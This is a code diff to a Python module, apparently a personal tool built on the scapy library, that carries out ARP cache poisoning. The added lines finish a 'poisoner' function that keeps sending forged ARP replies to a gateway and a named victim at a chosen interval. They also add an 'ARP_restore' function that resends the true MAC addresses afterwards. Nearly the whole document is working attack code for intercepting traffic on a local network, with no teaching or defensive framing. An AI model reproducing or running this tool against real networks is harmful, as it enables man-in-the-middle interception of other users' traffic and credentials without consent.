@@ -1,5 +1,8 @@
-from scapy.all import *
 from re import match
+from time import sleep
+from scapy.all import *
+
+BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
 
 def MAC_for_IP(given_IP, timeout=2, retry=2, verbose=0):
     """
@@ -14,14 +17,14 @@ def MAC_for_IP(given_IP, timeout=2, retry=2, verbose=0):
                       receiving an answer (default=2)
         verbose     : Verbosity level (default=0)
     """
-    broadcast_arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=given_IP, timeout=)
+    broadcast_arp_frame = Ether(dst=BROADCAST_MAC)/ARP(op="who-has", pdst=given_IP)
     recv = srp1(broadcast_arp_frame, timeout=timeout, retry=-retry, verbose=verbose)
     if recv is not None:
         return recv.payload.hwsrc
     return None
 
 
-def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0):
+def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1):
     """
     Main poisoner function.
 
@@ -31,6 +34,7 @@ def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0):
     Optional Args:
         new_MAC     : MAC address to replace with (default=None, meaning the current system)
         verbose     : Verbosity level (default=0)
+        interval    : Interval between attacks (default=1)
     """
     if verbose > 0:
         print("Finding MAC addresses for gateway and victim...", end="")
@@ -54,6 +58,58 @@ def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0):
 
         frame_to_gateway.hwsrc = new_MAC
         frame_to_victim.hwsrc = new_MAC
+
+    if verbose > 0:
+        print("done")
+
+    # Keep doing this for a long time i.e., until the poisoner stops it.
+    n_times = 0
+    while 1:
+        try:
+            send(frame_to_gateway)
+            send(frame_to_victim)
+            sleep(interval)
+            n_times += 1
+        except KeyboardInterrupt:
+            break
+
+    return n_times
+
+def ARP_restore(gateway_IP, victim_IP, verbose):
+    """
+    Generally used to revert the changes made by the poisoning attack.
+
+    Args:
+        gateway_IP  : IP address of the gateway router
+        victim_IP   : IP address of the victim machine
+    Optional Args:
+        verbose     : Verbosity level (default=0)
+    """
+    if verbose > 0:
+        print("Find MAC addresses for gateway and victim...", end="")
+    gateway_MAC = MAC_for_IP(given_IP=gateway_IP, verbose=verbose)
+    victim_MAC = MAC_for_IP(given_IP=victim_IP, verbose=verbose)
+
+    if verbose > 0:
+        print("done")
+
+    if verbose > 0:
+        print("Creating ARP packets...", end="")
+    # This creates a packet to the gateway to reset the correct entry
+    frame_from_victim = ARP(op="is-at", pdst=gateway_IP, hwdst=BROADCAST_MAC, psrc=victim_IP, hwsrc=victim_MAC)
+
+    # This creates a packet to the victim node to reset the correct entry
+    frame_from_gateway = ARP(op="is-at", pdst=victim_IP, hwdst=BROADCAST_MAC, psrc=gateway_IP, hwsrc=gateway_MAC)
+
+    if verbose > 0:
+        print("done")
+
+    if verbose > 0:
+        print("Resetting...")
+    # Send it 5 times to be sure.
+    for _ in range(0, 5):
+        send(frame_from_victim)
+        send(frame_from_gateway)
 
     if verbose > 0:
         print("done")
